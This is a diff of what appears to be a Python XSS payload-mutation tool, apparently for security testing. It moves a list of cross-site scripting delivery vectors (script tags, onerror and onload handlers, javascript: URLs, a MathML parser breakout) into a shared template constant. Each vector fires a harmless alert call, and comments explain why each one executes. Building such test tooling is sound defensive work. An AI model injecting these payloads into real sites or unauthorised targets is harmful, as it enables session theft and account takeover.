@@ -134,42 +134,47 @@ def xss_event_handler_swap(payload: str) -> str:
     return re.sub(r"on[a-z]+(?=\s*=)", repl, payload, count=1, flags=re.IGNORECASE)
 
 
+_XSS_VECTOR_TEMPLATES = [
+    "<script>{call}</script>",
+    "<img src=x onerror={call}>",
+    "<svg onload={call}>",
+    "<body onload={call}>",
+    "<iframe src=javascript:{call}>",
+    "<details open ontoggle={call}>",
+    "<input autofocus onfocus={call}>",
+    "<select autofocus onfocus={call}>",
+    # MathML integration-point breakout: <mpath> opened inside a <style>
+    # in a <math> context closes the math context, so the trailing <img>
+    # is parsed as a live element and its onerror fires.
+    '<math><mtext></mtext><mglyph><style><mpath href="#</style><img src=x onerror={call}>',
+    # Media elements whose src fails to load fire onerror on their own.
+    "<video src=x onerror={call}>",
+    "<audio src=x onerror={call}>",
+    # <template> content: the inner <svg> still parses an onload handler
+    # via the parser's template-content handling (works in Chrome/FF).
+    "<template><svg onload={call}>",
+    # <data> wraps the <img> so the onerror handler still attaches.
+    "<data><img src=x onerror={call}>",
+    # Legacy form element; type=image renders it and src failure fires onerror.
+    "<isindex type=image src=x onerror={call}>",
+    # Scrolling text: onstart fires as soon as the marquee begins scrolling.
+    "<marquee onstart={call}>",
+    # <meter> with a value above max; onmouseover fires on hover.
+    "<meter value=2 max=1 onmouseover={call}>",
+    # <button formaction=javascript:> submits to a javascript: URL on click.
+    "<form><button formaction=javascript:{call}>",
+]
+
+
 def xss_tag_vector_swap(payload: str) -> str:
     """Swaps the delivery tag/vector while keeping the JS call, e.g.
-    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>."""
+    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>.
+
+    The full vector pool is _XSS_VECTOR_TEMPLATES, shared with the smoke
+    coverage tripwire so the two can't drift apart."""
     m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
     call = m.group(0) if m else "alert(1)"
-    vectors = [
-        f"<script>{call}</script>",
-        f"<img src=x onerror={call}>",
-        f"<svg onload={call}>",
-        f"<body onload={call}>",
-        f"<iframe src=javascript:{call}>",
-        f"<details open ontoggle={call}>",
-        f"<input autofocus onfocus={call}>",
-        f"<select autofocus onfocus={call}>",
-        # MathML integration-point breakout: <mpath> opened inside a <style>
-        # in a <math> context closes the math context, so the trailing <img>
-        # is parsed as a live element and its onerror fires.
-        f"<math><mtext></mtext><mglyph><style><mpath href=\"#</style><img src=x onerror={call}>",
-        # Media elements whose src fails to load fire onerror on their own.
-        f"<video src=x onerror={call}>",
-        f"<audio src=x onerror={call}>",
-        # <template> content: the inner <svg> still parses an onload handler
-        # via the parser's template-content handling (works in Chrome/FF).
-        f"<template><svg onload={call}>",
-        # <data> wraps the <img> so the onerror handler still attaches.
-        f"<data><img src=x onerror={call}>",
-        # Legacy form element; type=image renders it and src failure fires onerror.
-        f"<isindex type=image src=x onerror={call}>",
-        # Scrolling text: onstart fires as soon as the marquee begins scrolling.
-        f"<marquee onstart={call}>",
-        # <meter> with a value above max; onmouseover fires on hover.
-        f"<meter value=2 max=1 onmouseover={call}>",
-        # <button formaction=javascript:> submits to a javascript: URL on click.
-        f"<form><button formaction=javascript:{call}>",
-    ]
-    return random.choice(vectors)
+    return random.choice([tmpl.format(call=call) for tmpl in _XSS_VECTOR_TEMPLATES])
 
 
 def xss_attr_breakout(payload: str) -> str:
